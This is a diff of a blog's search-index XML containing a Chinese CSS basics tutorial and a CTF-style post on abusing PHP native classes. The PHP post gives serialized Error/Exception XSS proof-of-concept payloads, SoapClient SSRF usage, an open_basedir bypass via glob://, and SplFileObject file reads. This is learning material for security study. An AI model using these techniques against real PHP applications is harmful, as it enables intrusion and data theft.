+<p><strong>注意：</strong>如果外部样式放在内部样式的后面，则外部样式将覆盖内部样式</p>
+</blockquote>
+<h2 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h2><h3 id="Backgrounds"><a href="#Backgrounds" class="headerlink" title="Backgrounds"></a>Backgrounds</h3><h4 id="background-color"><a href="#background-color" class="headerlink" title="background-color:"></a>background-color:</h4><ul>
+<li>页面: body{background-color: }</li>
+<li>正文: p{background-color:}</li>
+<li>标题: h1{background-color: }</li>
+<li>指定模块: div{background-color:}</li>
+</ul>
+<h4 id="backgound-image"><a href="#backgound-image" class="headerlink" title="backgound-image"></a>backgound-image</h4><p>描述了元素的背景图像</p>
+<ul>
+<li>实例</li>
+</ul>
+<pre><code class="highlight plaintext">body&#123;background-image: url(&#x27;paper,gif&#x27;)&#125;</code></pre>
+
+]]></content>
+      <tags>
+        <tag>-Web前端 -CSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>磨好的利剑:PHP原生类</title>
+    <url>/2025/07/01/%E7%A3%A8%E5%A5%BD%E7%9A%84%E5%88%A9%E5%89%91-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
+    <content><![CDATA[<h1 id="PHP原生类"><a href="#PHP原生类" class="headerlink" title="PHP原生类"></a>PHP原生类</h1><p>相当综合的应用呢，利用面广的不行，爽赤</p>
+<p>常见的原生类有以下几个</p>
+<pre><code class="highlight plaintext">1.Error/Exception
+2.FilesystemIterator/SplFileObject/DirectoryIterator/GlobIterator
+3.SoapClient
+4.SimpleXMLElement</code></pre>
+
+<p>当然还有有些偶尔能用上的<code>ZipArchive</code></p>
+<h2 id="XSS利用"><a href="#XSS利用" class="headerlink" title="XSS利用"></a>XSS利用</h2><h3 id="Error-Exception内置类"><a href="#Error-Exception内置类" class="headerlink" title="Error&#x2F;Exception内置类"></a>Error&#x2F;Exception内置类</h3><p><strong>Error</strong>:</p>
+<ul>
+<li>仅适用于PHP7版本</li>
+<li>在开启报错的情况下</li>
+</ul>
+<p>我们可以查看一下Error的内置方法</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="variable">$className</span> = <span class="string">&#x27;Error&#x27;</span>;
+
+<span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$className</span>);
+
+<span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;
+    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$className&#125;</span>::<span class="subst">&#123;$method&#125;</span>&quot;</span> . PHP_EOL;
+&#125;
+<span class="meta">?&gt;</span></code></pre>
+
+<p>得到:</p>
+<pre><code class="highlight plaintext">Error::__construct
+Error::__wakeup
+Error::getMessage
+Error::getCode
+Error::getFile
+Error::getLine
+Error::getTrace
+Error::getPrevious
+Error::getTraceAsString
+Error::__toString</code></pre>
+
+<p>那么就可以利用XSS的<code>__toString</code>魔术方法打一个XSS</p>
+<p>测试代码:</p>
+<pre><code class="highlight plaintext">&lt;?php
+$a = unserialize($_GET[&#x27;whoami&#x27;]);
+echo $a;
+?&gt;</code></pre>
+
+<p>(如果不知道原生类的情况下可能直接趋势了吧</p>
+<p>那么就用Error类构造一个POC</p>
+<pre><code class="highlight plaintext">&lt;?php
+$a = new Error(&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;);
+$b = serialize($a);
+echo urlencode($b);  
+?&gt;
+//O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A44%3A%22C%3A%5CUsers%5Cayano%5CPhpstormProjects%5CWWW%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701145615605.png" alt="image-20250701145615605"></p>
+<p>可以看到成功弹出</p>
+<p><code>Exception</code>也是同理的</p>
+<p>得到</p>
+<pre><code class="highlight plaintext">O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A46%3A%22C%3A%5CUsers%5Cayano%5CPhpstormProjects%5CWWW%5Cmethod.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701150814244.png" alt="image-20250701150814244"></p>
+<h2 id="SSRF利用"><a href="#SSRF利用" class="headerlink" title="SSRF利用"></a>SSRF利用</h2><p>用Soap之前先要在php.ini里开一下extension</p>
+<p>这里只提供一下PHP8的配置方法，因为7和以上的版本配置的内容是不一样的</p>
+<p>先把路径改一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701160148997.png" alt="image-20250701160148997"></p>
+<p>这里初始是<code>ext</code>，需要改掉并且去掉前面的;</p>
+<p>再找到<code>soap</code></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701160246768.png" alt="image-20250701160246768"></p>
+<p>这边也需要去掉前面的;</p>
+<p>这样就算配好了。</p>
+<h3 id="SoapClient何许人也"><a href="#SoapClient何许人也" class="headerlink" title="SoapClient何许人也?"></a>SoapClient何许人也?</h3><p>PHP 的内置类<code> SoapClient</code> 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p>
+<p>类摘要如下：</p>
+<pre><code class="highlight plaintext">SoapClient &#123;
+    /* 方法 */
+    public __construct ( string|null $wsdl , array $options = [] )
+    public __call ( string $name , array $args ) : mixed
+    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null
+    public __getCookies ( ) : array
+    public __getFunctions ( ) : array|null
+    public __getLastRequest ( ) : string|null
+    public __getLastRequestHeaders ( ) : string|null
+    public __getLastResponse ( ) : string|null
+    public __getLastResponseHeaders ( ) : string|null
+    public __getTypes ( ) : array|null
+    public __setCookie ( string $name , string|null $value = null ) : void
+    public __setLocation ( string $location = &quot;&quot; ) : string|null
+    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool
+    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed
+&#125;</code></pre>
+
+<p>可以看到，该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 <code>SoapClient</code> 类可以被我们运用在 SSRF 中。<code>SoapClient</code> 这个类也算是目前被挖掘出来最好用的一个内置类。</p>
+<p>该类的构造函数如下：</p>
+<pre><code class="highlight plaintext">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</code></pre>
+
+<ul>
+<li>第一个参数是用来指明是否是<code>wsdl</code>模式，将该值设为null则表示非<code>wsdl</code>模式。</li>
+<li>第二个参数为一个数组，如果在<code>wsdl</code>模式下，此参数可选；如果在非<code>wsdl</code>模式下，则必须设置location和<code>uri</code>选项，其中<code>location</code>是要将请求发送到的SOAP服务器的URL，而<code>uri</code> 是SOAP服务的目标命名空间。</li>
+</ul>
+<p>在知道两个选项的含义之后payload就相当容易构造了</p>
+<p><strong>设置第一个参数为null，第二个为<code>target_url</code></strong></p>
+<p>这里其实就可以配合<strong>CRLF</strong>或者<strong>HTTP请求走私</strong>搞一下</p>
+<h2 id="open-basedir绕过"><a href="#open-basedir绕过" class="headerlink" title="open_basedir绕过"></a><code>open_basedir</code>绕过</h2><p><code>DirectoryIterator</code>与glob:&#x2F;&#x2F;协议结合将无视<code>open_basedir</code>对目录的限制，可以用来列举出指定目录下的文件。</p>
+<h2 id="任意文件遍历"><a href="#任意文件遍历" class="headerlink" title="任意文件遍历"></a>任意文件遍历</h2><h3 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a><code>SplFileObject</code></h3><p>这个是按行读取的，如果多行读取就需要遍历了</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;
+    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;SplFileObject&#x27;</span>;
+    <span class="keyword">public</span> <span class="variable">$para</span> = <span class="string">&#x27;./flag/flag.php&#x27;</span>;
+&#125;
+<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();
+<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);
+<span class="meta">?&gt;</span></code></pre>
+
+
+
+]]></content>
+      <tags>
+        <tag>-Web</tag>
       </tags>
   </entry>
   <entry>
@@ -7811,229 +8034,6 @@ $</code></pre>
 
 
 <h2 id="vm2逃逸"><a href="#vm2逃逸" class="headerlink" title="vm2逃逸"></a>vm2逃逸</h2>]]></content>
-      <tags>
-        <tag>-Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>深度学习网页前端之CSS</title>
-    <url>/2025/03/30/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%BD%91%E9%A1%B5%E5%89%8D%E7%AB%AF%E4%B9%8BCSS/</url>
-    <content><![CDATA[<h1 id="深度学习网页前端之CSS"><a href="#深度学习网页前端之CSS" class="headerlink" title="深度学习网页前端之CSS"></a>深度学习网页前端之CSS</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>你如果问我CSS是什么<del>CSS就是CSS啊</del></p>
-<p>那我可以说，平时浏览网页的主要内容就算由CSS构成的，如果说HTML是骨架，那么CSS就是主要的血肉</p>
-<p>看看菜鸟教程上是怎么解释的:<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250329160026108.png" alt="image-20250329160026108"></p>
-<h2 id="CSS基础语法"><a href="#CSS基础语法" class="headerlink" title="CSS基础语法"></a>CSS基础语法</h2><p>CSS由两个主要的部分构成:</p>
-<ul>
-<li>选择器 &#x2F;&#x2F;需要改变样式的HTML元素</li>
-<li>一条或多条说明 &#x2F;&#x2F;每给说明&#x3D;1个属性+1个值</li>
-</ul>
-<p>每个属性有一个值。属性和值被冒号分开</p>
-<p>一般都放在head部分的style里</p>
-<p>大概长这个样子</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250329160327242.png" alt="image-20250329160327242"></p>
-<p>css的注释使用经典的&#x2F;* *&#x2F;</p>
-<h2 id="对于多模块的处理"><a href="#对于多模块的处理" class="headerlink" title="对于多模块的处理"></a>对于多模块的处理</h2><p>用过F12的都知道，一个成熟的网页远远不止一种单调的元素，而是能让你眼花缭乱的，这就是通过选择器来进行不同的渲染的</p>
-<h3 id="id-选择器"><a href="#id-选择器" class="headerlink" title="id 选择器"></a>id 选择器</h3><p>在{}前加上<code>#[选择器名字]</code></p>
-<p>在下面要使用这些属性+值的部分的开始标签加上<code>id=&quot;[选择器名字]&quot;</code></p>
-<p>这样就大功告成了</p>
-<blockquote>
-<p>[!IMPORTANT]</p>
-<p>ID属性不要以数字开头，数字开头的ID在 Mozilla&#x2F;Firefox 浏览器中不起作用</p>
-</blockquote>
-<h3 id="class选择器"><a href="#class选择器" class="headerlink" title="class选择器"></a>class选择器</h3><p>class选择器用于描述一组元素的样式，使用经典款前后闭合</p>
-<p>head部分:.</p>
-<pre><code class="highlight css">.<span class="selector-attr">[选择器名字]</span>&#123;
-属性与值
-&#125;</code></pre>
-
-<p>body部分: </p>
-<pre><code class="highlight css">&lt;<span class="selector-tag">div</span> class=&quot;<span class="selector-attr">[选择器名称]</span>&quot;&gt;
-
-&lt;/<span class="selector-tag">div</span>&gt;</code></pre>
-
-<h2 id="CSS的插入"><a href="#CSS的插入" class="headerlink" title="CSS的插入"></a>CSS的插入</h2><p>CSS的插入方式有三种</p>
-<ul>
-<li>外部样式表</li>
-<li>内部样式表</li>
-<li>内联样式</li>
-</ul>
-<h3 id="外部样式表"><a href="#外部样式表" class="headerlink" title="外部样式表"></a>外部样式表</h3><p>就和图片差不多，从服务器的目录下引入样式表</p>
-<pre><code class="highlight html"><span class="comment">&lt;!-- html内 --&gt;</span>
-<span class="tag">&lt;<span class="name">head</span>&gt;</span>
-<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;mystyle.css&quot;</span>&gt;</span>
-<span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>
-
-<pre><code class="highlight css"><span class="comment">/*CSS文件内*/</span>
-hr &#123;<span class="attribute">color</span>:sienna;&#125;
-<span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>:<span class="number">20px</span>;&#125;
-<span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;/images/back40.gif&quot;</span>);&#125;</code></pre>
-
-<p>浏览器会从css文件中读取样式声明，并根据声明来格式文档</p>
-<blockquote>
-<p>用作外部表的CSS文件不能包含任何的 html 标签</p>
-</blockquote>
-<p>不要属性值和单位之间留空格:如 <code>margin-left: 20 px</code>应该写为<code>margin-left: 20px</code></p>
-<h3 id="内部样式表"><a href="#内部样式表" class="headerlink" title="内部样式表"></a>内部样式表</h3><p>单个文档需要特殊样式时，就使用内部样式表：</p>
-<pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span>
-<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span>
-<span class="language-css">hr &#123;<span class="attribute">color</span>:sienna;&#125;</span>
-<span class="language-css"><span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>:<span class="number">20px</span>;&#125;</span>
-<span class="language-css"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;images/back40.gif&quot;</span>);&#125;</span>
-<span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>
-<span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>
-
-<h3 id="内联样式"><a href="#内联样式" class="headerlink" title="内联样式"></a>内联样式</h3><p>由于要将表现和内容混杂在一起，内联样式会损失掉样式表的许多优势。请慎用这种方法，例如当样式仅需要在一个元素上应用一次时。</p>
-<p>要使用内联样式，你需要在相关的标签内使用样式（style）属性。Style 属性可以包含任何 CSS 属性。本例展示如何改变段落的颜色和左外边距：</p>
-<pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color:sienna;margin-left:20px&quot;</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>
-
-<h3 id="样式的继承"><a href="#样式的继承" class="headerlink" title="样式的继承"></a>样式的继承</h3><p>如果某些属性在不同的样式表中被同样的选择器定义，那么属性值将从更具体的样式表中被继承过来。 </p>
-<p>例如，外部样式表拥有针对 h3 选择器的三个属性：</p>
-<pre><code class="highlight css"><span class="selector-tag">h3</span> &#123;  <span class="attribute">color</span>:red;    <span class="attribute">text-align</span><span class="selector-pseudo">:left</span>;    <span class="attribute">font-size</span>:<span class="number">8pt</span>; &#125;</code></pre>
-
-<p>而内部样式表拥有针对 h3 选择器的两个属性：</p>
-<pre><code class="highlight css"><span class="selector-tag">h3</span> &#123;    <span class="attribute">text-align</span><span class="selector-pseudo">:right</span>;    <span class="attribute">font-size</span>:<span class="number">20pt</span>; &#125;</code></pre>
-
-<p>假如拥有内部样式表的这个页面同时与外部样式表链接，那么 h3 得到的样式是：</p>
-<pre><code class="highlight plaintext">color:red; text-align:right; font-size:20pt;</code></pre>
-
-<p>即颜色属性将被继承于外部样式表，而文字排列（text-alignment）和字体尺寸（font-size）会被内部样式表中的规则取代。</p>
-<hr>
-<p>样式的优先级为:</p>
-<p><strong>（内联样式）Inline style &gt; （内部样式）Internal style sheet &gt;（外部样式）External style sheet &gt; 浏览器默认样式</strong></p>
-<blockquote>
-<p><strong>注意：</strong>如果外部样式放在内部样式的后面，则外部样式将覆盖内部样式</p>
-</blockquote>
-<h2 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h2><h3 id="Backgrounds"><a href="#Backgrounds" class="headerlink" title="Backgrounds"></a>Backgrounds</h3><h4 id="background-color"><a href="#background-color" class="headerlink" title="background-color:"></a>background-color:</h4><ul>
-<li>页面: body{background-color: }</li>
-<li>正文: p{background-color:}</li>
-<li>标题: h1{background-color: }</li>
-<li>指定模块: div{background-color:}</li>
-</ul>
-<h4 id="backgound-image"><a href="#backgound-image" class="headerlink" title="backgound-image"></a>backgound-image</h4><p>描述了元素的背景图像</p>
-<ul>
-<li>实例</li>
-</ul>
-<pre><code class="highlight plaintext">body&#123;background-image: url(&#x27;paper,gif&#x27;)&#125;</code></pre>
-
-]]></content>
-      <tags>
-        <tag>-Web前端 -CSS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>磨好的利剑:PHP原生类</title>
-    <url>/2025/07/01/%E7%A3%A8%E5%A5%BD%E7%9A%84%E5%88%A9%E5%89%91-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
-    <content><![CDATA[<h1 id="PHP原生类"><a href="#PHP原生类" class="headerlink" title="PHP原生类"></a>PHP原生类</h1><p>相当综合的应用呢，利用面广的不行，爽赤</p>
-<p>常见的原生类有以下几个</p>
-<pre><code class="highlight plaintext">1.Error/Exception
-2.FilesystemIterator/SplFileObject/DirectoryIterator/GlobIterator
-3.SoapClient
-4.SimpleXMLElement</code></pre>
-
-<p>当然还有有些偶尔能用上的<code>ZipArchive</code></p>
-<h2 id="XSS利用"><a href="#XSS利用" class="headerlink" title="XSS利用"></a>XSS利用</h2><h3 id="Error-Exception内置类"><a href="#Error-Exception内置类" class="headerlink" title="Error&#x2F;Exception内置类"></a>Error&#x2F;Exception内置类</h3><p><strong>Error</strong>:</p>
-<ul>
-<li>仅适用于PHP7版本</li>
-<li>在开启报错的情况下</li>
-</ul>
-<p>我们可以查看一下Error的内置方法</p>
-<pre><code class="highlight php"><span class="meta">&lt;?php</span>
-<span class="variable">$className</span> = <span class="string">&#x27;Error&#x27;</span>;
-
-<span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$className</span>);
-
-<span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;
-    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$className&#125;</span>::<span class="subst">&#123;$method&#125;</span>&quot;</span> . PHP_EOL;
-&#125;
-<span class="meta">?&gt;</span></code></pre>
-
-<p>得到:</p>
-<pre><code class="highlight plaintext">Error::__construct
-Error::__wakeup
-Error::getMessage
-Error::getCode
-Error::getFile
-Error::getLine
-Error::getTrace
-Error::getPrevious
-Error::getTraceAsString
-Error::__toString</code></pre>
-
-<p>那么就可以利用XSS的<code>__toString</code>魔术方法打一个XSS</p>
-<p>测试代码:</p>
-<pre><code class="highlight plaintext">&lt;?php
-$a = unserialize($_GET[&#x27;whoami&#x27;]);
-echo $a;
-?&gt;</code></pre>
-
-<p>(如果不知道原生类的情况下可能直接趋势了吧</p>
-<p>那么就用Error类构造一个POC</p>
-<pre><code class="highlight plaintext">&lt;?php
-$a = new Error(&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;);
-$b = serialize($a);
-echo urlencode($b);  
-?&gt;
-//O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A44%3A%22C%3A%5CUsers%5Cayano%5CPhpstormProjects%5CWWW%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701145615605.png" alt="image-20250701145615605"></p>
-<p>可以看到成功弹出</p>
-<p><code>Exception</code>也是同理的</p>
-<p>得到</p>
-<pre><code class="highlight plaintext">O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A46%3A%22C%3A%5CUsers%5Cayano%5CPhpstormProjects%5CWWW%5Cmethod.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701150814244.png" alt="image-20250701150814244"></p>
-<h2 id="SSRF利用"><a href="#SSRF利用" class="headerlink" title="SSRF利用"></a>SSRF利用</h2><p>用Soap之前先要在php.ini里开一下extension</p>
-<p>这里只提供一下PHP8的配置方法，因为7和以上的版本配置的内容是不一样的</p>
-<p>先把路径改一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701160148997.png" alt="image-20250701160148997"></p>
-<p>这里初始是<code>ext</code>，需要改掉并且去掉前面的;</p>
-<p>再找到<code>soap</code></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701160246768.png" alt="image-20250701160246768"></p>
-<p>这边也需要去掉前面的;</p>
-<p>这样就算配好了。</p>
-<h3 id="SoapClient何许人也"><a href="#SoapClient何许人也" class="headerlink" title="SoapClient何许人也?"></a>SoapClient何许人也?</h3><p>PHP 的内置类<code> SoapClient</code> 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p>
-<p>类摘要如下：</p>
-<pre><code class="highlight plaintext">SoapClient &#123;
-    /* 方法 */
-    public __construct ( string|null $wsdl , array $options = [] )
-    public __call ( string $name , array $args ) : mixed
-    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null
-    public __getCookies ( ) : array
-    public __getFunctions ( ) : array|null
-    public __getLastRequest ( ) : string|null
-    public __getLastRequestHeaders ( ) : string|null
-    public __getLastResponse ( ) : string|null
-    public __getLastResponseHeaders ( ) : string|null
-    public __getTypes ( ) : array|null
-    public __setCookie ( string $name , string|null $value = null ) : void
-    public __setLocation ( string $location = &quot;&quot; ) : string|null
-    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool
-    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed
-&#125;</code></pre>
-
-<p>可以看到，该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 <code>SoapClient</code> 类可以被我们运用在 SSRF 中。<code>SoapClient</code> 这个类也算是目前被挖掘出来最好用的一个内置类。</p>
-<p>该类的构造函数如下：</p>
-<pre><code class="highlight plaintext">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</code></pre>
-
-<ul>
-<li>第一个参数是用来指明是否是<code>wsdl</code>模式，将该值设为null则表示非<code>wsdl</code>模式。</li>
-<li>第二个参数为一个数组，如果在<code>wsdl</code>模式下，此参数可选；如果在非<code>wsdl</code>模式下，则必须设置location和<code>uri</code>选项，其中<code>location</code>是要将请求发送到的SOAP服务器的URL，而<code>uri</code> 是SOAP服务的目标命名空间。</li>
-</ul>
-<p>在知道两个选项的含义之后payload就相当容易构造了</p>
-<p><strong>设置第一个参数为null，第二个为<code>target_url</code></strong></p>
-<p>这里其实就可以配合<strong>CRLF</strong>或者<strong>HTTP请求走私</strong>搞一下</p>
-<h2 id="open-basedir绕过"><a href="#open-basedir绕过" class="headerlink" title="open_basedir绕过"></a><code>open_basedir</code>绕过</h2><p><code>DirectoryIterator</code>与glob:&#x2F;&#x2F;协议结合将无视<code>open_basedir</code>对目录的限制，可以用来列举出指定目录下的文件。</p>
-<h2 id="任意文件遍历"><a href="#任意文件遍历" class="headerlink" title="任意文件遍历"></a>任意文件遍历</h2><h3 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a><code>SplFileObject</code></h3><p>这个是按行读取的，如果多行读取就需要遍历了</p>
-<pre><code class="highlight php"><span class="meta">&lt;?php</span>
-<span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;
-    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;SplFileObject&#x27;</span>;
-    <span class="keyword">public</span> <span class="variable">$para</span> = <span class="string">&#x27;./flag/flag.php&#x27;</span>;
-&#125;
-<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();
-<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);
-<span class="meta">?&gt;</span></code></pre>
-
-
-
-]]></content>
       <tags>
         <tag>-Web</tag>
       </tags>
